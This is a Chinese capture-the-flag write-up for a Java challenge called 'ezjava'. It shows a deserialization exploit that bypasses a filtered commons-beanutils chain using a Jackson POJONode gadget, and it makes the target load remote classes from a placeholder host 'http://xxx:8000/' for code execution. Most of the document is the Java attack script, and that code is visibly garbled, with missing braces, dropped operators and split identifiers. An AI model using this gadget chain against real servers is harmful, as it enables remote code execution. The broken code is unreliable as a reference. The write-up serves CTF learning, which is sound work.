# ezjava

1.首先反编译jar包得到代码，发现账号密码，登陆进去看看：

![image-20240828095908397](./assets/image-20240828095908397.png)

2.寻找可用的类，发现了反序列化入口！

![image-20240828100128616](./assets/image-20240828100128616.png)

3.定位到工具utils模块，我们应该是需要触发User的getGift，然后添加远程或者本地类路径进⾏类加载rce

![image-20240828100458902](./assets/image-20240828100458902.png)

4.这道题cb链被过滤了，那么我们可以通过jackson绕过，攻击脚本如下：

```java
import com.example.ycbjava.bean.User;
import com.fasterxml.jackson.databind.node.POJONode;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import sun.reflect.ReflectionFactory;
import java.lang.reflect.Constructor;
import java.Lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
public class jack
public static void main(String[]args)throws Exception
User user new User("url:http://xxx:8000/","Asuri")
POJONode jsonNodes new POJONode(user);
Class<?>innerclass=Class.forName("javax.swing.UIDefaultssTextAndMnemonicHashMap");
Map map1=(HashMap)createwithoutConstructor(innerclass);
Map map2=(HashMap)createWithoutConst ructor(innerclass);
map1.put(jsonNodes,"222")
map2.put(jsonNodes,"111")
Field field=HashMap.class.getDeclaredField("loadFactor");
field.setAccessible(true);
field.set(map1,1);
Field field1=HashMap.class.getDeclaredField("loadFactor");
field1.setAccessible(true);
field1.set(map2,1);
Hashtable hashtable=new Hashtable();
hashtable.put(map1,1);
hashtable.put(map2,1);
map1.put(jsonNodes,null);
map2.put(jsonNodes,null)
ByteArrayOutputst ream barr new ByteArrayOutputstream();
Objectoutputstream objectoutputstream new objectOutputst ream(bar
r);
objectoutputstream.writeobject(hashtable);
Base64Encode(barr);
private static void Base64Encode(ByteArrayOutputStream bs){
byte[]encode Base64.getEncoder().encode(bs.toByteArray());
String s new String(encode);
System.out.println(s);
public static <T>Object createWithoutConstructor (Class classToInstantiate
throws NoSuchMethodException,InstantiationException,IllegalA
ccessException,InvocationTargetException
return createwithoutConstructor(classToInstantiate,Object.class,
new class [0],new object [0]);
public static <T>T createwithoutConstructor Class<T>classToInstant
iate,Class<?super T>constructorclass,Class<?>[]consArgTypes,Object[] consArgs
throws NoSuchMethodException,InstantiationException,IllegalAccessException,InvocationTargetException
Constructor<?super T>objCons constructorclass.getDeclaredConstructor(consArgTypes)
objCons.setAccessible(true);
Constructor<?>sc ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate,objCons);
sc.setAccessible(true);
return (T)sc.newInstance(consArgs);
```

5.开启vps监听上传恶意字节码即可：

![b35b9eb2a3092e2a941f8fb98fa38d6f](./assets/b35b9eb2a3092e2a941f8fb98fa38d6f.png)